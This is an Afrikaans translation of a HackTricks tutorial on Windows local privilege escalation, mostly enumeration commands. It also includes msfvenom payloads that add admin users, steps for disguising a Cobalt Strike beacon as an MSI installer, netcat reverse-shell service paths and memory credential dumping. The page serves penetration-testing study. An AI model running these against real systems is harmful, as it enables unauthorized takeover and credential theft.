# Windows Plaaslike Bevoorregte Eskalasie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Beste hulpmiddel om te soek na Windows plaaslike bevoorregte eskalasie vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows Teorie

### Toegangstokens

**As jy nie weet wat Windows-toegangstokens is nie, lees die volgende bladsy voordat jy voortgaan:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL's - DACL's/SACL's/ACE's

**Kyk na die volgende bladsy vir meer inligting oor ACL's - DACL's/SACL's/ACE's:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integriteitsvlakke

**As jy nie weet wat integriteitsvlakke in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te ontleed**, uitvoerbare lêers uit te voer of selfs **jou aktiwiteite op te spoor**. Jy moet die volgende **bladsy** lees en al hierdie **verdedigingsmeganismes** **ontleed** voordat jy met die bevoorregte eskalasie-ontleding begin:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Stelselinligting

### Weergawe-inligtingontleding

Kyk of die Windows-weergawe enige bekende kwesbaarheid het (kyk ook na die gepaste opdaterings).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe-uitbuitings

Hierdie [webwerf](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis het meer as 4,700 sekuriteitskwesbaarhede, wat die **massiewe aanvalsoppervlak** wat 'n Windows-omgewing bied, aantoon.

**Op die stelsel**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingesluit)_

**Plaaslik met stelselinligting**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-opberging van uitbuitings:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige geloofsbriewe/Sappige inligting wat in die omgewingsveranderlikes gestoor is?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Oorplasing lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell pyplyn uitvoerings word aangeteken, insluitende uitgevoerde bevele, bevelaanroepings, en dele van skripte. Nietemin, volledige uitvoeringsbesonderhede en uitvoerresultate mag nie vasgelê word nie.

Om dit moontlik te maak, volg die instruksies in die "Transkripsie lêers" afdeling van die dokumentasie, en kies vir **"Module Logging"** in plaas van **"Powershell Transkripsie"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeure vanaf PowersShell-logboeke te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Skripsbloklogging**

'n Volledige aktiwiteit en volledige inhoudsrekord van die skrips se uitvoering word vasgelê, wat verseker dat elke blok kode gedokumenteer word soos dit loop. Hierdie proses behou 'n omvattende ouditstroom van elke aktiwiteit, waardevol vir forensiese ondersoek en die analise van skadelike gedrag. Deur alle aktiwiteit tydens die uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die loggebeure vir die Skripsblok kan gevind word binne die Windows-gebeurtenisleser by die pad: **Toepassing en Dienslogboeke > Microsoft > Windows > PowerShell > Operasioneel**.\
Om die laaste 20 gebeure te sien, kan jy die volgende gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Instellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Bestuurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel compromitteer as die opdaterings nie aangevra word met http**S** nie, maar met http.

Jy begin deur te kyk of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Indien jy 'n antwoord soos die volgende kry:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gelyk is aan `1`.

Dan is **dit vatbaar vir uitbuiting.** As die laaste register gelyk is aan 0, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie kwesbaarhede uit te buit, kan jy gereedskap soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Dit is MiTM-gewapende uitbuitingskripte om 'n 'vals' opdatering in te spuit in nie-SSL WSUS-verkeer.

Lees die navorsing hier:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Hierdie is basies die fout wat hierdie fout uitbuit:

> As ons die mag het om ons plaaslike gebruikersproksi te wysig, en Windows Updates gebruik die proksi wat in Internet Explorer se instellings gekonfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te hardloop om ons eie verkeer te onderskep en kode as 'n verhewe gebruiker op ons bate te hardloop.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook sy sertifikaatstoor gebruik. As ons 'n selfondertekende sertifikaat vir die WSUS-gashuisnaam genereer en hierdie sertifikaat by die huidige gebruiker se sertifikaatstoor voeg, sal ons in staat wees om beide HTTP- en HTTPS-WSUS-verkeer te onderskep. WSUS gebruik geen HSTS-soort meganismes om 'n vertrou-op-eerste-gebruik-tipe validering op die sertifikaat te implementeer nie. As die aangebiede sertifikaat deur die gebruiker vertrou word en die korrekte gashuisnaam het, sal dit deur die diens aanvaar word.

Jy kan hierdie kwesbaarheid uitbuit met die gereedskap [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit vrygestel is).

## KrbRelayUp

'n **Plaaslike voorreg-escalatie**-kwesbaarheid bestaan in Windows **domein**-omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP-ondertekening nie afgedwing word nie,** gebruikers self-regte besit wat hulle in staat stel om **Hulpbron-Gebaseerde Beperkte Delegasie (RBCD) te konfigureer,** en die vermoë vir gebruikers om rekenaars binne die domein te skep. Dit is belangrik om daarop te let dat hierdie **vereistes** voldoen word met **verstekinstellings**.

Vind die **uitbuiting in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die vloei van die aanval, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ladingstelsels
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Indien jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik

### PowerUP

Gebruik die `Write-UserAddMSI` bevel van power-up om binne die huidige gids 'n Windows MSI-binêre lêer te skep om voorregte te eskaleer. Hierdie skripsie skryf 'n vooraf saamgestelde MSI-installeerder wat vra vir 'n gebruiker/groep byvoeging (dus sal jy GUI-toegang benodig):
```
Write-UserAddMSI
```
### Uitvoer die geskepte binêre lêer om voorregte te eskaleer.

### MSI Omslag

Lees hierdie handleiding om te leer hoe om 'n MSI omslag te skep met behulp van hierdie gereedskap. Let daarop dat jy 'n "**.bat**" lêer kan omsluit as jy **net** wil **opdragreëls** **uitvoer**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Skep MSI met WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Skep MSI met Visual Studio

* **Genereer** met Cobalt Strike of Metasploit 'n **nuwe Windows EXE TCP lading** in `C:\privesc\beacon.exe`
* Maak **Visual Studio** oop, kies **Skep 'n nuwe projek** en tik "installer" in die soekblokkie. Kies die **Opstel Tovenaar** projek en klik **Volgende**.
* Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **plaas oplossing en projek in dieselfde gids**, en klik **Skep**.
* Bly klik op **Volgende** totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Voeg by** en kies die Beacon lading wat jy net gegenereer het. Klik dan **Voltooi**.
* Lig die **AlwaysPrivesc** projek in die **Oplossingsontleder** uit en in die **Eienskappe**, verander **TargetPlatform** van **x86** na **x64**.
* Daar is ander eienskappe wat jy kan verander, soos die **Skrywer** en **Vervaardiger** wat die geïnstalleerde program meer geloofwaardig kan laat lyk.
* Regskliek op die projek en kies **Beeld > Aangepaste Aksies**.
* Regskliek op **Installeer** en kies **Voeg Aangepaste Aksie by**.
* Dubbelklik op **Toepassingsgids**, kies jou **beacon.exe** lêer en klik **OK**. Dit sal verseker dat die beacon lading uitgevoer word sodra die installeerder uitgevoer word.
* Onder die **Aangepaste Aksie Eienskappe**, verander **Run64Bit** na **Waar**.
* Laastens, **bou dit**.
* As die waarskuwing `Lêer 'beacon-tcp.exe' wat 'x64' teiken, is nie versoenbaar met die projek se teikenplatform 'x86'` getoon word, maak seker jy stel die platform na x64.

### MSI Installering

Om die **installasie** van die skadelike `.msi` lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buuit, kan jy gebruik maak van: _exploit/windows/local/always\_install\_elevated_

## Antivirus en Detectors

### Ouditinstellings

Hierdie instellings besluit wat **gelog** word, so jy moet aandag gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, is interessant om te weet waar die logboeke gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike administrateur wagwoorde**, wat verseker dat elke wagwoord **uniek, willekeurig, en gereeld opgedateer** word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs deur gebruikers wat voldoende regte deur ACLs verleen is, benader word, wat hulle in staat stel om plaaslike administrateur wagwoorde te sien indien gemagtig.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Indien aktief, word **plain-text wagwoorde gestoor in LSASS** (Local Security Authority Subsystem Service).\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-beskerming

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Plaaslike Sekuriteitsowerheid (LSA) ingevoer om pogings deur onbetroubare prosesse te **blokkeer** om sy geheue te **lees** of kode in te spuit, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA-beskerming hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Geloofsbewaarder

**Geloofsbewaarder** is in **Windows 10** ingevoer. Dit doel is om die geloofsbriewe wat op 'n toestel gestoor word teen bedreigings soos oor-die-hashing aanvalle te beskerm.| [**Meer inligting oor Geloofsbewaarder hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekasieerde Geldele

**Domein-geldele** word geauthentiseer deur die **Plaaslike Sekuriteitsowerheid** (LSA) en word deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmeldingsdata geauthentiseer word deur 'n geregistreerde sekuriteitspakket, word domein-geldele vir die gebruiker tipies gevestig.\
[**Meer inligting oor Gekasieerde Gelde hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumerateer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waar jy deel van uitmaak interessante regte het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy deel is van 'n paar bevoorregte groepe, kan jy bevoorregte regte eskaleer. Leer meer oor bevoorregte groepe en hoe om hulle te misbruik om regte te eskaleer hier:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipulasie

Leer meer oor wat 'n token is op hierdie bladsy: [Windows Tokens](../authentication-credentials-uac-and-efs/#access-tokens).\
Kyk na die volgende bladsy om meer te leer oor interessante tokens en hoe om hulle te misbruik:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisgids
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Hardloopprosesse

### Lêer- en Vouerregte

Eerstens, lys die prosesse **om te kyk vir wagwoorde binne die opdraglyn van die proses**.\
Kyk of jy **sekere binêre lopies kan oorskryf** of as jy skryfregte van die binêre vouer het om moontlike [**DLL Ontvoeringsaanvalle**](dll-hijacking/) te benut:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
### Altyd kyk vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om voorregte te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kyk na die regte van die prosesse se binêre lêers**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Die toestemmings van die lêers van die prosesse binêre lêers nagaan (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Geheue wagwoordontginning

Jy kan 'n geheuedump van 'n lopende proses skep deur **procdump** vanaf sysinternals te gebruik. Dienste soos FTP het die **geloofsbriewe in teks in die geheue**, probeer om die geheue te dump en lees die geloofsbriewe.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SISTEEM loop, kan 'n gebruiker toelaat om 'n CMD te skep, of deurlêer na gids.**

Voorbeeld: "Windows Help en Ondersteuning" (Windows + F1), soek vir "opdrag-prompt", klik op "Klik om die Opdrag-prompt oop te maak"

## Dienste

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Regte

Jy kan **sc** gebruik om inligting oor 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binêre **accesschk** van _Sysinternals_ te hê om die vereiste bevoorregtingsvlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Skakel diens in

As jy hierdie fout het (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit inskakel deur die volgende te gebruik:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**'n Ander omweg** vir hierdie probleem is om uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diens binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE\_ALL\_ACCESS** op 'n diens besit, is dit moontlik om die uitvoerbare binêre van die diens te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herlaai diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Priviliges kan deur verskeie toestemmings geëskaleer word:

- **SERVICE\_CHANGE\_CONFIG**: Laat herkonfigurasie van die diens se binêre lêer toe.
- **WRITE\_DAC**: Stel toestemmingherkonfigurasie in, wat lei tot die vermoë om dienskonfigurasies te verander.
- **WRITE\_OWNER**: Maak eienaarskapverkryging en toestemmingherkonfigurasie moontlik.
- **GENERIC\_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC\_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service\_permissions_ gebruik word.

### Diensbinêre lêers swak toestemmings

**Kyk of jy die binêre lêer kan wysig wat deur 'n diens uitgevoer word** of as jy **skryftoestemmings op die vouer** waar die binêre lêer geleë is ([**DLL Ontvoering**](dll-hijacking/))**.**\
Jy kan elke binêre lêer wat deur 'n diens uitgevoer word kry deur **wmic** (nie in system32 nie) te gebruik en jou toestemmings te kontroleer deur **icacls** te gebruik:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste register wysigingsregte

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan **nagaan** of jy **regte** oor 'n diens **register** het deur die volgende te doen:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dit moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre lêer wat deur die diens uitgevoer word, verander word.

Om die Pad van die uitgevoerde binêre lêer te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienste-register AppendData/AddSubdirectory-toestemmings

Indien jy hierdie toestemming oor 'n register het, beteken dit dat **jy sub-registers van hierdie een kan skep**. In die geval van Windows-dienste is dit **genoeg om arbitrêre kode uit te voer:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Ongeslote Dienspaaie

Indien die pad na 'n uitvoerbare lêer nie binne aanhalingstekens is nie, sal Windows probeer om elke einde voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### Lys van alle ongekwoteerde dienspaaie, uitgesluit dié wat behoort aan ingeboude Windows-diens:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n diens binêre lêer skep met metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word as 'n diens misluk. Hierdie kenmerk kan ingestel word om te verwys na 'n binêre lêer. As hierdie binêre lêer vervangbaar is, kan voorreg-escalasie moontlik wees. Meer besonderhede kan gevind word in die [amp;offisiële dokumentasie](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Toepassings

### Geïnstalleerde Toepassings

Kontroleer die **regte van die binêre lêers** (miskien kan jy een oorskryf en voorregte eskaleer) en van die **lêers** ([DLL Ontvoering](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryf Toestemmings

Kyk of jy 'n konfigurasie lêer kan wysig om 'n spesiale lêer te lees of as jy 'n binêre lêer kan wysig wat deur 'n Administrateur-rekening uitgevoer gaan word (schedtasks).

'n Manier om swak vouer/lêer toestemmings in die stelsel te vind, is om te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
